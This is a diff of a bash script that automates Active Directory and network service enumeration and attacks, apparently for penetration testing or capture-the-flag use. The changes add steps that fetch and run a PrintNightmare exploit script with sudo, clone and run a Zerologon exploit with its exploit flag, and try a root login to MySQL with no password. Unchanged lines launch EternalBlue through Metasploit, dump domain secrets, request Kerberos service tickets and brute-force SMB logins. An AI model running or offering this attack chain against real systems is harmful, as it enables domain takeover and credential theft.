@@ -8,13 +8,10 @@
 echo -e '\E[31;40m' "Made by OvergrownCarrot1, thanks for using"
 echo ""
 echo -e '\E[31;35m' "This script looks at other tools, you need impacket, feroxbuster and crackmapexec downloaded and in $PATH to work correctly"
-sleep 2
 echo ""
 echo -e '\E[31;35m' "If you do not know all the information below then leave blank, the more information the more enumeration will happen, may need to run multiple times and check the $DOMAINIP.txt file for more information"; tput sgr0
-sleep 2
 echo ""
 echo -e '\E[31;35m' "Anything that is needed to be downloaded is downloaded with Kali distro in mind, if you use another distro do it yourself..."
-sleep 2
 echo ""
 echo -e '\E[31;40m' "Script is not stuck, it is saving everything to a text file, kerbrute may take a very long time depending on wordlist if using xato-net-10-million-usernames be very patient"; tput sgr0
 sleep 2
@@ -39,17 +36,20 @@ if [ $answer = y ] ; then
 		echo "I am not going to type out every song, come on man"
 	fi
 fi
-sleep 1
 
-read -p "Do you need any of the following tools? (feroxbuster(f), impacket(i), crackmapexec(c), ldapdomaindump(l) all (a), none(n)" answer
+read -p "Do you need any of the following tools? (feroxbuster(f), impacket(i)(PrintNightmare Version), crackmapexec(c), ldapdomaindump(l) all (a), none(n)" answer
 if [ $answer = f ] ; then
 	echo -e '\E[31;40m' "Downloading feroxbuster"
 	sudo apt update
 	sudo apt install -y feroxbuster
 elif [ $answer = i ] ; then
-	echo -e '\E[31;40m' "Downloading impacket"
+	echo -e '\E[31;40m' "Downloading impacket in home directory"
 	sudo apt update
-	sudo apt install python3-impacket
+	cd 
+	pip3 uninstall impacket
+	git clone https://github.com/cube0x0/impacket
+	cd impacket
+	python3 ./setup.py install
 elif [ $answer = c ] ; then
 	echo -e '\E[31;40m' "Downloading crackmapexec"
 	sudo apt update
@@ -57,7 +57,11 @@ elif [ $answer = c ] ; then
 elif [ $answer = a ] ; then
 	echo -e '\E[31;40m' "Downloading all 3"
 	sudo apt install -y feroxbuster
-	sudo apt install python3-impacket
+	pip3 uninstall impacket
+	cd 
+	git clone https://github.com/cube0x0/impacket
+	cd impacket
+	python3 ./setup.py install
 	sudo apt install crackmapexec
 	sudo pip install ldapdomaindump
 	sudo pip install ldap3
@@ -73,7 +77,6 @@ elif [ $answer = n ] ; then
 else
 	echo -e '\E[31;40m' "Help me help you... that is not an answer"
 fi
-sleep 1 
 
 echo ""
 echo -e '\E[31;40m' "Domain Name"; tput sgr0
@@ -98,7 +101,6 @@ elif [ $answer = n ] ; then
 else
 	echo ""
 fi
-sleep 1
 
 if grep https://nmap.org $DOMAINIP.txt
 then
@@ -151,7 +153,6 @@ then
 else
 	echo ""
 fi
-sleep 1
 
 if [ $USER ] && [ $PASS ]
 then
@@ -199,7 +200,6 @@ then
 		echo -e '\E[31;35m' "Not an answer or you spelled something wrong"; tput sgr0
 	fi
 fi	
-sleep 1
 
 if grep 21/tcp $DOMAINIP.txt
 then
@@ -207,32 +207,25 @@ then
 	nmap -p 21 -sC -sV -vv -n $DOMAINIP -Pn >> $DOMAINIP.txt
 	echo -e '\E[31;35m' "Check $DOMAINIP.txt to see if FTP allows anonymous access"; tput sgr0
 fi
-sleep 1
 
 if grep 25/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "SMTP is running, utilizing NMAP to see some stuff"; tput sgr0
 	nmap --script=smtp* $DOMAINIP -Pn -vv -sC -sV -p 25 >> $DOMAINIP.txt
 fi
-sleep 1
 
 if grep 389/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "LDAP is open trying ldapdomaindump and ldapsearch"; tput sgr0
-	echo -e '\E[31;35m' "Install ldapdomaindump if not already installed"
-	sudo pip install ldapdomaindump
-	sudo pip install ldap3
-	sudo pip install dnspython
 	echo -e '\E[31;35m' "Creating new directory to put any information found into $DOMAINIP.ldap"; tput sgr0
 	mkdir $DOMAINIP.ldap
 	cd $DOMAINIP.ldap
-	echo -e '\E[31;35m' "If information was dumped it will be in here"
+	echo -e '\E[31;35m' "If information was dumped it will be in here"; tput sgr0
 	pwd
 	ldapdomaindump ldap://$DOMAINIP:389
 	cd ..
 	ldapsearch -H ldap://$DOMAINIP -x -b "DC=$DOMAIN,DC=local" '(objectclass=person)' >> $DOMAINIP.txt
 fi
-sleep 1
 
 if grep 53 $DOMAINIP.txt
 then
@@ -241,7 +234,6 @@ then
 	dig $DOMAIN @$DOMAINIP any >> $DOMAINIP.txt
 	dig -t AXFR $DOMAIN @$DOMAINIP >> $DOMAINIP.txt
 fi
-sleep 1
 
 if grep 80/tcp $DOMAINIP.txt
 then
@@ -259,12 +251,11 @@ then
 			echo -e '\E[31;35m' "Need a y or n"; tput sgr0
 		fi
 	elif [ $answer = n ] ; then
-		echo -e '\E[31;35m' "Continuing Script"
+		echo -e '\E[31;35m' "Continuing Script"; tput sgr0
 	else
-		echo -e '\E[31;35m' "Need a y or n"
+		echo -e '\E[31;35m' "Need a y or n"; tput sgr0
 	fi
 fi
-sleep 1
 
 if grep 8080/tcp $DOMAINIP.txt
 then
@@ -288,7 +279,6 @@ then
 		echo -e '\E[31;35m' "Need a y or n"
 	fi
 fi
-sleep 1
 
 if grep 8888/tcp $DOMAINIP.txt
 then
@@ -311,7 +301,6 @@ then
 		echo -e '\E[31;35m' "Need a y or n"
 	fi
 fi
-sleep 1
 
 if grep 443/tcp $DOMAINIP.txt
 then
@@ -331,29 +320,24 @@ then
 		echo -e '\E[31;35m' "Running feroxbuster with big.txt"
 		feroxbuster -u https://$DOMAINIP:443 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
 	elif [ $answer = n ] ; then
-		echo -e '\E[31;35m' "Continuing Script"
+		echo -e '\E[31;35m' "Continuing Script"; tput sgr0
 	else
-		echo -e '\E[31;35m' "Not an answer"
+		echo -e '\E[31;35m' "Not an answer"; tput sgr0
 	fi
 fi
-sleep 1
 
 if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
 then
 	echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
 	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP >> $DOMAINIP.txt
 	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -request >> $DOMAINIP.txt
-	sleep 1
-	echo -e '\E[31;35m' "Looking up SID"; tput sgr0
+		echo -e '\E[31;35m' "Looking up SID"; tput sgr0
 	lookupsid.py "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $DOMAINIP.txt
-	sleep 1
-	echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
+		echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
 	secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc >> $DOMAINIP.txt
-	sleep 1
-else
+	else
 	echo ""
 fi
-sleep 1
 
 if grep 111/tcp $DOMAINIP.txt
 then
@@ -361,7 +345,6 @@ then
 	rpcclient -U "" -N DOMAINIP >> $DOMAINIP.txt
 	rpcinfo -p $DOMAINIP >> $DOMAINIP.txt
 fi
-sleep 1
 
 if grep 445/tcp $DOMAINIP.txt
 then
@@ -373,7 +356,6 @@ then
 	enum4linux $DOMAINIP >> $DOMAINIP.txt
 	enum4linux -u $USER -p PASS -a $DOMAINIP >> $DOMAINIP.txt
 fi
-sleep 1
 
 if grep "CVE:CVE-2017-0143" $DOMAINIP.txt
 then
@@ -387,7 +369,6 @@ then
 		msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
 	fi
 fi
-sleep 1
 
 if grep 1521/tcp $DOMAINIP.txt
 then
@@ -395,14 +376,20 @@ then
 	tnscmd10g version -h $DOMAINIP >> $DOMAINIP.txt
 	tnscmd10g status -h $DOMAINIP >> $DOMAINIP.txt
 fi
-sleep 1
 
 if grep 3306/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "MySQL is open, trying some stuff"; tput sgr0
 	nmap --script=mysql-* >> DOMAINIP.txt
+	read -p "Would you like to try and login with root and no password? (y/n)" answer
+	if [ $answer = y ] ; then
+		mysql -h $DOMAINIP -u root
+	elif [ $answer = n ] ; then
+		echo -e '\E[31;35m' "Not trying root no pass"; tput sgr0
+	else
+		echo -e '\E[31;35m' "Not an answer, need a y or n"; tput sgr0
+	fi
 fi
-sleep 1
 
 if grep 2049/tcp $DOMAINIP.txt
 then
@@ -423,44 +410,43 @@ then
 		echo -e '\E[31;35m' "Not an answer, need a y or n"; tput sgr0
 	fi
 fi
-sleep 1
 
 if grep 1433/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "MSSQL is running, checking some things"; tput sgr0
 	sqsh -s $DOMAINIP -U sa >> $DOMAINIP.txt
 fi
-sleep 1
 
 echo -e '\E[31;40m' "Testing if vulnerable to Print Nightmare"; tput sgr0
 impacket-rpcdump @$DOMAINIP | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
 impacket-rpcdump @$DOMAIN | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
-
-if grep "Print System Remote Protocol" $DOMAINIP.txt
+sleep 2
+if grep -i "Print System Remote Protocol" $DOMAINIP.txt
 then
 	read -p "System seems vulnerable to Print Nightmare, exploit? (y/n)" answer
 	read -p "Would you like to download a PrintNightmare Script made by OvergrownCarrot1? (y/n)" answer
 	if [ $answer = y ] ; then
-		wget https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/PrintNightmareScript.sh 
-		echo -e '\E[31;40m' "Saved script to PrintNightmareScript.sh"
+		git clone https://github.com/overgrowncarrot1/PrintNightmareScript.sh.git
+		cd PrintNightmareScript
+		sudo bash PrintNightmareScript.sh
+		cd ..
 elif [ $answer = n ] ; then
 	echo -e '\E[31;40m' "Not downloading script"; tput sgr0
 else
 	echo -e '\E[31;40m' "Need a y or n"; tput sgr0
 	fi
 fi
-sleep 1
 
 read -p "Test for Zero Logon? (y/n)" answer
 if [ $answer = y ] ; then
 	echo -e '\E[31;40m' "Testing if vulnerable to Zero Logon (this may take some time)"; tput sgr0
-	echo -e '\E[31;40m' "Location of zerologon.py? ex: (~/Tools/zerologon.py)"; tput sgr0
-	read ZEROLOC
+	sudo git clone https://github.com/sho-luv/zerologon.git
 	echo -e '\E[31;40m' 'SMB Share Name?'; tput sgr0
 	read SHARENAME
-	python3 $ZEROLOC "$SHARENAME" "$DOMAINIP" 
+	cd zerologon
+	python3 zerologon.py "$SHARENAME" "$DOMAINIP" -exploit
+	cd ..
 fi
-sleep 1
 
 read -p "Test for Login Brute Force through Crackmapexec SMB? (y/n)" answer
 if [ $answer = y ] ; then
@@ -471,7 +457,6 @@ if [ $answer = y ] ; then
 	read PASSFILE
 	crackmapexec smb $DOMAINIP -u $USERNAME -p $PASSFILE -d $DOMAIN --continue-on-success >> $DOMAINIP.txt
 fi
-sleep 1
 
 if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
 then
@@ -494,7 +479,6 @@ then
 		echo "Not an answer"
 	fi
 fi
-sleep 1
 
 read -p "Test for PSExec Login (y/n)" answer
 if [ $answer = y ] ; then
@@ -504,7 +488,6 @@ elif [ $answer = n ]; then
 else
 	echo "Not an answer"
 fi
-sleep 1
 
 read -p "Try and escalate user with ntlmrealyx.py? (y/n)" answer
 if [ $answer = y ] ; then
@@ -515,7 +498,6 @@ elif [ $answer = n ]; then
 else
 	echo "Not an answer"
 fi
-sleep 1
 
 if grep 3389/tcp $DOMAINIP.txt
 then
@@ -545,7 +527,6 @@ then
 		echo "No idea what you want from me"
 	fi
 fi
-sleep 1
 
 read -p "Do you want to run external Bloodhound? (y/n)" answer
 if [ $answer = y ] ; then
@@ -568,7 +549,6 @@ if [ $answer = y ] ; then
 		echo "Not a valid answer"
 	fi
 fi
-sleep 1
 
 read -p "Do you want to open a new tab for responder? (y/n)" answer
 if [ $answer = y ] ; then
